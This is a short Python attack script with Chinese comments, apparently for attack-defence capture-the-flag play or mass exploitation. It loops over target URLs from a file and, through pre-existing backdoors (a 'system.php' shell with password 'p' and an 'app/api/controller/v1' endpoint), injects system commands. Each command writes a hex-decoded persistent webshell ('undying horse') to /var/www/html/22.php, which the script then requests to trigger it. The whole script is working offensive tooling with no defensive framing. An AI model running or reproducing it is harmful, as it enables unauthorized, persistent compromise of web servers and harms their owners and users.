from requests.exceptions import ReadTimeout
import requests


# 创建一个空列表，用于存储文件中的每一行
ip = []

# 打开文件
with open('./ip.txt', 'r', encoding='utf-8') as file:
    # 逐行读取
    line = file.readline()
    # 循环直到文件末尾
    while line:
        # 将读取的行添加到列表中，移除行尾的换行符
        ip.append(line.strip())
        # 读取下一行
        line = file.readline()

def get(ip):
    for i in range(0,len(ip)):
        try:
            url = ip[i]  # 假设ip是一个包含URL的列表
            url = url + 'system.php'  #后门位置
            passswd='p'              #密码
            url=url+'?'+passswd+'='  
            
            ##注意检查后面中有没有调用system()和echo()
            ##如果没有要加上完整的不死码应该是
            ## 'system("echo \'\' |xxd -r -ps > /var/www/html/22.php)'
            ##"'system("echo  |xxd -r -ps > /var/www/html/22.php)'"
            url = url +'''system(echo  |xxd -r -ps > /var/www/html/22.php);
                        '''
            print(url)
            requests.get(url=url, timeout=3)
            print(ip[i]+"：植入不死码成功")
            urltow = ip[i] + "22.php"
            requests.get(url=urltow, timeout=0.5)
        except ReadTimeout:
            print(ip[i])
            print("不死码访问成功")
        except:
            pass


def post(ip):
    for i in range(0, len(ip)):
        try:
            # 目标URL
            url = ip[i]  
            houmen_url = url + 'app/api/controller/v1'  #后门位置
            payload1 = {
                "Referer":
                'echo \'\' | xxd -r -ps > /var/www/html/22.php;'
            }
            ##'system("echo  |xxd -r -ps > /var/www/html/22.php)'
            requests.post(houmen_url, payload1, timeout=2)
            print("植入不死马成功")
            urltow = ip[i] + "22.php"
            requests.get(url=urltow, timeout=0.5)
        except ReadTimeout:
            print(ip[i])
            print("不死码访问成功")
        except:
            pass



##post传不死码
post(ip)

##get传不死码
get(ip)


